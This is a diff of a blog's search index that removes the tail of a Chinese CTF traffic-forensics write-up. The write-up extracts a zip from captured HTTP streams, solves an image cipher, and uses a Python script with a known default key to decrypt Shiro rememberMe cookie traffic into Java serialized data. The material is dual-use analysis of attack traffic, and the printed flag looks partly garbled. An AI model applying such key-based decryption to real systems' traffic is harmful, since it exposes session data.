-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb16.png"
-                        alt="ycb16"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb17.png"
-                        alt="ycb17"
-                 ></p>
-<p>在流13中发现下载了一个secret.txt</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb18.png"
-                        alt="ycb18"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb19.png"
-                        alt="ycb19"
-                 ></p>
-<p>base64解码响应的数据，发现有一个数据逆序的压缩包<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb20.png"
-                        alt="ycb20"
-                 ></p>
-<p>手动提取出压缩包，用之前得到的密码：Th15_11111111s_pP@sssssw000rd!!!</p>
-<p>解压压缩包可以得到一张 flag2.png 图片，图片明显分块，尝试拼图后发现无果，考虑JPG图片宽高修改</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb22.jpg"
-                        alt="ycb22"
-                 ></p>
-<p>获得一个猫猫字母表，谷歌识图以后找到对照表</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb23.jpg"
-                        alt="ycb23"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923170322209.png"
-                        alt="image-20240923170322209"
-                 ></p>
-<p>得到后半段flag</p>
-<p>在导出HTTP对象中导出几个网页，通过谷歌识图可以发现是<code>sharo-attacker</code>流量，追踪前几个流可以发现<code>sharo-attacker</code>内置字典的第十个密码就是密码：<code>MTIzNDU2Nzg5MGFiY2RlZg==</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补位</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>) * (<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 除去补16字节的多余字符</span></span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_CBC_Decrypt</span>(<span class="params">data, key, iv</span>): <span class="comment"># CBC模式的解密函数，data为密文，key为16字</span></span><br><span class="line">节密钥</span><br><span class="line">	aes = AES.new(key=key, mode=AES.MODE_CBC, iv=iv) <span class="comment"># 创建解密对象</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># decrypt AES解密 B64decode为base64 转码</span></span><br><span class="line">    result = aes.decrypt(data)</span><br><span class="line">    result = unpad(result) <span class="comment"># 除去补16字节的多余字符</span></span><br><span class="line">    <span class="keyword">return</span> result <span class="comment"># 以字符串的形式返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">data, key</span>):</span><br><span class="line">    f = base64.b64decode(data)</span><br><span class="line">    </span><br><span class="line">    keys = <span class="built_in">open</span>(<span class="string">&quot;shiro_keys.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    keyb = base64.b64decode(key)</span><br><span class="line">    iv = f[:<span class="number">16</span>]</span><br><span class="line">    enc = f[<span class="number">16</span>:]</span><br><span class="line">    de = aes_CBC_Decrypt(enc, keyb, iv)</span><br><span class="line">    <span class="keyword">return</span> de</span><br><span class="line"></span><br><span class="line">data =</span><br><span class="line"><span class="string">&quot;PGBTg3fqmEIidH1E+Fz7zVBJC4KTR5RmTmyZCUX1g8gK13Bt7GQaFr7Wh1kL+hCDTq9Vff4kcaITiLxPYsj8dCtR2SzEdQeP4jIY2Z3siUdZk2FMeSxEbt/4hzY5bmLUVKQh97Gu948+CKE9RsV+Gf7BltkNXOaim8OCv409wil2Ck4zXO7tnbWOiD6p4ZsQ2hzG8iFl/UlmaqpdUuS49kZ6BDbqp3dYqZ16+u2TNIb/jEkMMVX9X0bn4a9adFzeyCJQAFu0VrgDB/cpyvvwPAmDkKwvBdj8wWSB0ztuo6x+vrOKDNrxLITG0sxKrKlKIsZAt83lCbhiSYd8mgUtPiNkznWYxO07mRaNFWBNiNyGeg0vPNyh/NDF6e0JMkQQ6a77Otq0+Gnx7H/zYTBlxF+Id8b1T2XCQHSfkivOpERR53d23HSTsWeuFZB0Yqq8mgLdfIk7hOYTuTFqwkh0wfguA0gW63ixU8cno/3tP1JJqkcpo81eWhY2O/FPQw3jKyk5MfRE77i4NVtSTzMZ9ebKlYw/2fjPIydKI2nS/vsNGM1ebkKFbmwrdXYaIJIXMXRNEUYRfHOXgYsfQCy0zCgl5Df7BUe9sFY3azs2wS+q2Xo591nX358CsE+mx1Guao0icEcvtEXIrqRM0DWBcdGSkjdEIngr3qMlNUrlECh7fMSW5ThBmnTwqzLZDtxZzAJxQvk1zsuqMa+Uv1hoc0O7n5BrvDEAaiyWJ6Akrlv+bprjhsd0y9V0ugWn6TaIt1t5nr5xQTZQbFH0IpxYqoOpmuVgrVIpqaOXl4O7L/NyQBAZrrDqn5/ic+43MH8S+XwArv56xnbMSUUopwi02/LAQSykmpjuOhLjBD/sV+Faa7M6W+FlbSM3hAo9mAWg3APuBHEOTatRrZDi2KNNWfKN4pThkh2vaxyWmXqBw/s0xZpULD+T04KeaMgNdbtKmmfLou4aQD614KJQMtp2mITKexuyfhraT30LuO6XU1QFd7Gei/FfRE/Jfh6zWXPRln7aVbuoJzmrUPSG8gQlm/Bn6nacE91TAF2QRwOt7dOj3Tifn6wAEAWMhTVWisA6KxXdJWB9UujrEl5JhedC+aaO4Gzsv0JSe/sqGb1b5N9ik6sxBTqPEWCvLLzkcWEMIqRJyWX+gACpyH7ID9UH6/q+fq19s5WQicyuKmO6F3JzbSQ1bTi9ZcnbKBVKmtDFhTPl3ovIyVbT66xU4yQz8x1Wxg6u8zCCop6LKoz2l0X+J2iJRi7pJCOqlkemJCrSkNDb0+Rd+j6w4ysOcRolmKrhSvIJXzBfOqXvdJkRMW/7u4LfBTr0pLdJx3hhvKfgVRNAK0hY4nUrspG3iI06fEpT82tlWYG1YOt/+u2oSzPV3d0IQArSZG4YT6WnbLSpSVjPwSg5wJgo/HSzRKwBISyqi/JIcph+fts4iXiIWfSiFQG7WDvKpT0pwiUumcisZzaEDuaVtziVgHY4PUMWFWDjdbM0I21S6670Yh3HgvPdFEZBKYZH9k1yjx6+hA0n00/kyttVDNqGXjNXcLKjJBYOVS3RAtvsu3H5C4YxuaHjejZtNe2If+EBzVfMg3lkmdvwEkRk8qFuNf/6gJhl0mCozQc4hcdo/YddPCdw3Xz2nqpwCwktKmZ4Cw4wPmNXzFu/nYF2WKi77ix4m/kqdNq+UcOK0Fh6+90wMdLd3o9dCcMcebB4W0Ku0b71icf2Fku1e0KVaPpjstiQjENwBsQITTLb9NdX7pZ1EZDzmjoGAiEjuqpLeOBbrT6jqjl63QGXtgK8bKQDsPz89o6N1VCQnGrZ+Ld3Q0fMG5XsqGAG6qxWYLfwOAmccLF+L7r/UB2WiljDOu9PIzs3bTRmUYTA0IKjIzkIQdT/sqatU6m6MJS1NtUnw9FrGoo1Q0FFjw6ZGABsdzFtqVurzO0AURFytfONcNPXZXglgh4Mp//vPnNG1zN/KmSZGFhwrj2fKFmHfxKtlOtthcee9kUTOCBu8jQ/oaGKkCwNHvv6B44cn7AIERbbeDT+gJVHsspDLjKpVhFyGhi4ssUl2erofJNE0i3fo9XByIcrKym+pFimQ0fnOqwkdXXVUUSzSxZ8G81/5y6E2SZWOWtXUeMjCrW2PSpHL6qqFbA5948ahWxhJxOJAKNazcfF9vyxcOnlG7iRQkJZNMVQnsfT3Zj1DXFZvFXOisoUaw0EyIivu4b29+8nIkUIQ8JoCReGaieZxpCo0O0mOh9j8yBDgJEF2G4i5TYFzSwQ2PwlOje8O+ad1iP7/3T+414jq7LgBxBXqVzPMfSpO4UAPaO5UX9R8nMStSeLEBtTwtfGD/OI1A+lWgknHOib8Ad8v2nhDswZ0i/0PoEhLZsg4T4HIBMreLVWtoe85JsrDheKpgKIJkUdhTkrGj1P/la4E95QtS1ru9iDOd6Zj1pILecRCIJBQ45IyJtH136o4h6kMJZ2YHc96gFLZ7uo354/EL/Y2Af0/mH7ozFT/mFpE385alNIktepDiQ14+bwNDNfiJ1y3lFNchyXvkxeLPSOO4mR/xtdubdJO3ykYxKK+Y7l9HNg6Ogxt3wos5aF9w7MES9MMnrb/dvAjqB3jFVXKdh+PbRxyQi2If9v5xtmitQY6ye5k+29Z5dIji9fa4crisTtSFVKGD1HctYLItyN25GEbUYac9uomY3gNNFXE52EpQG7V9AUNlzcU6/kz9qAy23VmjAv/BwV0tOwb4y/OcM1JnfUy/Ytt137L9qDDFqnZPMs9WLDVUoT4tycFy9O0gJq8fL9IOXUNfXRdTkDP8DHHRB9R94t2PNZH7eaeZmuRhBYn/K1lf4HyhOpOensvbqDhIkr4ptTItj5Z9+ZFUsshKo7nJk8zk1z2sr/OBspn0MymxOIcnUqdNZeAbL2xaJnBvbic6iX66qKdOHeqI2/XWtTfp4fWzrz4vGXG7oRQjwOLisSOzzi2oQ7JY4h7i66tnIcW4W+Bn8E9MxZa1tPsEDjSndibCeiQcFRQAfoRmXnTRYgxloLIPxl8Mo2fPvwrmxRw/KPShAcnhCfE5vIY18ay6FmcxzDY5en5AV0TlNeJNYtJkfC0i0AkxFD+nYBSVoaF5cEdvWzAJX792JU0CbexCBF2cvkjXVXu6GmUw4bDMf1jlX8Djj6v5X/IYRfRxFX3hGev+iTybD2SMgw5pbSpqAXC9cT/8Iy7dyW0lfv3kgxCybFsQhO6x/jvWafEHRa0BkRxo4VbY/Jpcy7CyxR7TSRlYuQyNi7oETZY7v/yRU/h7+IIJZoKB9RQ/7aEcpUTja3yR7cqAgp62zVyIMIVi/kghAXjMxobexfBTaAD2W/upQr8EYVlQw32iD0wQjdzN4YYAmxTBefWLH6WV8dzPCiuV9eQGArTFaQk5Y+f6+l9sHcQ4CJtuaV+Ezt3ZKXauh9TckaKx50z6n6NYHJSqeAMNGUMMkPrM96oxM3p43cKZsPx5+STr8g1V0Yrj2z6pmG/lSwIW4a1gF/+qlDLZylquUovMfRX8ldH/ptcnkSS5Ws7l46/k/YvbsMVbKoiVhDYSvnpdtJp5Jkj/EjvaJ+4phWLh7ZvniqTxuM0YhdFQrUMnbyQpWD8NwFxwxzsVKYgYFQW+609rbB15dPT6ewZAPo2yoz9Czc6r5FMJ2E12VIK3TdeMZXxdS2hM9eK/hfv3z7uJLLTLDBPL/nziXvJzwnD/K256yfEBZhmhjx6NgEyh6qoEfgonqiC9RnVUplLHQPpjpVKP54s8qG4eKTRYwA6liKILpxt5mZYzGIqe0gi91qwpscqNdHoAi43wyF6JbIijNvWcCi5ws3/8GlWIjOWDiWI4MTFmBOus9pZjd28t3Nhs7ncA6wm6I48sPZQHdgAEoHR+peZkcURwI3M1koo5UVQpYK1WhOzHdokXtywVvk3OldpVugcRZsh8pjbp3ecNmNT5xV7nt1W40/ZO9YTyvtIHAJgxbPUfDayh1hwRa7Nfj8YOXLvdCcGjRHauYb25k+2JPXtySgg5CIhl2fYDTwTM2Ttw8fsyDBMtqBGwwON8YS8BnevlV2Uqr1i3tno3B+k9RyQrE8eiwqLyJ09D8SGuy7RE6OMIrZWW/mA08tv+8V3ccNhnYRhjVxLmVRF+1FR55/AQ0CeJwPvbhkQydYRfRiRUU2WriQWXG8jLiT6KhSeVt2qXOTZnaAIyu7rN6fl04O2yVYY4o53/t4w1q8dMbhMHtUiuIJCkz8q+N50942sukYLoQVI5LJuunZHn3hyn1wsE5+7JvHL+QoPTxRBUxIepZy/XdMSBd3IsoPBdieUqavq6dGM4Hc9Fu6MFq9qY0vJEtwix6Y2uf/NGSDAGn9Z2N+dBPUcxzrynA0V6nLXJSBxr2dY/GUCrcFcCJqLS+paX0mb/tDcJwMhlPMBwPZ30ak2YiJJNr7/exwxHPNRQQaifzNCd04oL0i+YaXKMgMEcaLtSW0VXHeGy5CjJ+JdLjvel9oruQUYAcPbxTNYcEDHoe0GVQlYmls96MIzzmOzKdCD1MkC10i13W5OlgGUOdnFDXg7fDZ5NFf2xAL6akDsIZqDlRzPbw0X2gjcLqxegC5fvxVenZtYDQhuXysOpYSwDw9213IQZ0pVS2QyY/FhAEIihqTkwbQsSUBuiwDNWIC1pHYzravpv113X2E5ZDMAwUIOpqFY2oP2eRHhfe8wPYP3UvpsxP2UFbVGhe7L6DIjlOtLP6i9vCgkcHHT+/08ZUEkPDn/t2bR6ErTBizXiIdd/1ckYVQh0QPtRGQrPPgxtqHmf2OqVUhIz6Og4WpCv1DGaMlocm/ES1F+A6LKhiaEVOktsAdl0Rjt/EXOX6TSAEIGt6y+p4g4/fzcY2efjZw5ai20qWGjfLbRJy8Ns6drxCU4VwVLXuJp1VhtTSvyEKWSPq1zIuIX8EoE2fOVtyeQq1xZctUeKx3vcA084UE6YslsCjV2eTGEgwKKrmuzYDX6E47ns8oiDFbU8QExV8LfQ3jDvpSMGlAQEQoFr5iyM96KLIf7zeMt3CQ5vtkxlbKnmaDPXflZH1DCO/4+o55WSM0Y3G1eF4lhxljG/FELd60521dAM0OQ78I6I48tdNfjRX1qWsZ+qv+G6aK/qxpOrG2CkPY2nfDCIKcsUDvo1XrqqYvDt/JkRs7Y7xBN8K9PMDxd1BmM6+jAngrc+MrZUBgq1m60Sx1k+dQb8ITsSzh/rEMBWlRvi3FL+8mZNsZHsmN8y7yIkU9OOnH30Ew1rPPfC1s/VaSw4X4lDX0ua0M2yEXzRQXVivZ/aOaioypAn6UDoQDEMUPJ5AGX/N8xHhVGv0A3ZZNcX79SwNQyzJ/o6EQxRwZkJduUAqO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;d.data&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(binascii.hexlify(force(data,<span class="string">&quot;MTIzNDU2Nzg5MGFiY2RlZg==&quot;</span>)).decode())</span><br></pre></td></tr></table></figure>
-<p>然后得到 Java 序列化数据，用<code>SerializationDumper</code>得到结构化数据</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb21.jpg"
-                        alt="ycb21"
-                 ></p>
-<p>得到前半段flag，拼接获得<code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EB OFDELQDIAA&#125;</code></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>categories</title>
     <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>关于作者</title>
-    <url>/about/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -7179,6 +7174,11 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
   <entry>
     <title>tags</title>
     <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>关于作者</title>
+    <url>/about/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
 </search>
